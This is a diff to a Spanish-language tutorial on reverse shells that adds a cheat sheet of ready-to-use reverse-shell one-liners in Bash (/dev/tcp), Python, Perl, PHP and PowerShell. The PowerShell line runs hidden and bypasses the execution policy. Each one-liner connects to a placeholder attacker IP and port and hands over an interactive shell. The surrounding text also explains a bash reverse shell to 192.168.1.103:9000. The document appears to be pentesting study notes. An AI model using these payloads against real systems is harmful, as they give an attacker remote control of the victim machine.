@@ -109,8 +109,32 @@ El comando ncat es una versión mejorada y más segura de Netcat, incluida en la
 
 **Debemos de tener en cuenta:**
 - Transmitir una shell sin cifrar a través de la red puede ser peligroso y exponer información sensible. La herramienta ncat ofrece la opción de establecer conexiones cifradas utilizando el parámetro --ssl para mejorar la seguridad.
-- La herramienta ncap debe estar instalada tanto en la máquina víctima como en la atacante.
+- La herramienta ncap debe estar instalada tanto en la máquina víctima como en la atacante. Si no lo estuviera tendríamos como alternativas:
+  - Bash Shell: Podemos usar la capacidad de Bash para redirigir la entrada/salida a través de /dev/tcp:
+    ```
+    bash -i >& /dev/tcp/ipAtacante/puerto 0>&1
+    ```
 
+  - Python Shell: Podemos crear una shell reversa con un script de Python:
+    ```
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_DEL_ATACANTE",PUERTO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    ```
+
+  - Perl Shell: Perl es otro intérprete de scripting que se encuentra comúnmente en sistemas Unix y Linux::
+    ```
+    perl -e 'use Socket;$i="IP_DEL_ATACANTE";$p=PUERTO;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+    ```
+
+  - PHP Shell: Podemos ejecutar el siguiente código PHP para establecer una conexión reversa:
+    ```
+    php -r '$sock=fsockopen("IP_DEL_ATACANTE",PUERTO);exec("/bin/sh -i <&3 >&3 2>&3");'
+    ```
+
+  - PowerShell:
+    ```
+    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("IP_DEL_ATACANTE",PUERTO);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    ```
 
 **Diferencias ncat y netcat:**
 - ncat y netcat son relacionados, pero no son exactamente lo mismo.
@@ -179,3 +203,5 @@ El comando bash -c "bash -i >& /dev/tcp/192.168.1.103/9000 0>&1" es un ejemplo d
 
 En resumen, este comando inicia una nueva instancia de Bash que redirige su entrada y salida a través de una conexión TCP a 192.168.1.103 en el puerto 9000, permitiendo así al atacante interactuar con la shell del sistema objetivo. Para que este ataque funcione, el atacante debe tener un servidor escuchando en el puerto 9000, esperando la conexión entrante.
 
+
+### 1.6 Estabilización de la shell
